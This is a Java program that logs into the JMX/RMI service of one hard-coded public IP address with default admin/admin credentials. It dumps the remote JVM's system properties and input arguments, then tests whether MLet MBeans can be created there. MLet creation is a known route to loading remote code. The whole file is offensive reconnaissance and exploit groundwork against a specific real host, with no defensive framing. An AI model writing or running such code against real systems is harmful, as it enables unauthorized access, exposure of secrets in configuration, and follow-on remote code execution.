import javax.management.*;
import javax.management.remote.*;
import javax.management.remote.rmi.*;
import javax.management.openmbean.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.net.*;
import java.util.*;
public class JmxSysprops {
  static final String REAL="160.202.130.243";
  static class RSF extends RMISocketFactory {
    public Socket createSocket(String host,int port) throws IOException {
      if (host==null||host.equals("localhost")||host.equals("127.0.0.1")||host.equals("0.0.0.0")) host=REAL;
      Socket s=new Socket(); s.setSoTimeout(20000); s.connect(new InetSocketAddress(host,port),20000); return s;
    }
    public ServerSocket createServerSocket(int port) throws IOException { return new ServerSocket(port); }
  }
  public static void main(String[] a) throws Exception {
    RMISocketFactory.setSocketFactory(new RSF());
    java.rmi.registry.Registry reg=java.rmi.registry.LocateRegistry.getRegistry(REAL,8085);
    RMIServer stub=(RMIServer)reg.lookup("jmxrmi");
    Map<String,Object> env=new HashMap<>();
    env.put(JMXConnector.CREDENTIALS, new String[]{"admin","admin"});
    JMXConnector conn=new RMIConnector(stub,env); conn.connect();
    MBeanServerConnection m=conn.getMBeanServerConnection();
    // SystemProperties
    System.out.println("=== java.lang:type=Runtime SystemProperties ===");
    TabularData sp = (TabularData) m.getAttribute(new ObjectName("java.lang:type=Runtime"), "SystemProperties");
    for (Object row : sp.values()) {
      CompositeData cd=(CompositeData)row;
      System.out.println("  "+cd.get("key")+" = "+cd.get("value"));
    }
    System.out.println("\n=== java.lang:type=Runtime InputArguments ===");
    String[] ia=(String[])m.getAttribute(new ObjectName("java.lang:type=Runtime"),"InputArguments");
    for (String s:ia) System.out.println("  "+s);
    // Check MLet MBean & createMBean
    System.out.println("\n=== MLet / createMBean availability ===");
    try {
      Set<ObjectName> ml = m.queryNames(new ObjectName("*:type=MLet"), null);
      System.out.println("MLet MBeans: "+ml);
    } catch(Exception e){ System.out.println("MLet query err: "+e); }
    try {
      ObjectName def = new ObjectName("DefaultDomain:type=MLet");
      MBeanInfo inf=m.getMBeanInfo(def);
      System.out.println("DefaultDomain:type=MLet info: "+inf.getDescription());
      for (MBeanOperationInfo o:inf.getOperations()) System.out.println("  OP "+o.getName()+"("+Arrays.toString(Arrays.stream(o.getSignature()).map(p->p.getType()).toArray())+")");
    } catch(Exception e){ System.out.println("DefaultDomain MLet: "+e.getMessage()); }
    // Check createMBean on MBeanServerDelegate? No - it's on MBeanServer. Test if we can createMBean from URL (MLet style)
    System.out.println("\n=== MBeanServer createMBean capability (test stub) ===");
    try {
      // The mbsc interface has createMBean. Try a harmless non-existent URL to see if it's allowed (expect MLetNotFoundException or SecurityException)
      ObjectName test = new ObjectName("MLetTest:id=1");
      try {
        m.createMBean("javax.management.loading.MLet", test);
        System.out.println("createMBean MLet local SUCCESS (registered) -> "+m.getMBeanInfo(test));
        m.unregisterMBean(test);
      } catch(Exception e){ System.out.println("createMBean local MLet: "+e.getClass().getName()+": "+e.getMessage()); }
    } catch(Exception e){ System.out.println("err: "+e); }
    conn.close();
  }
}
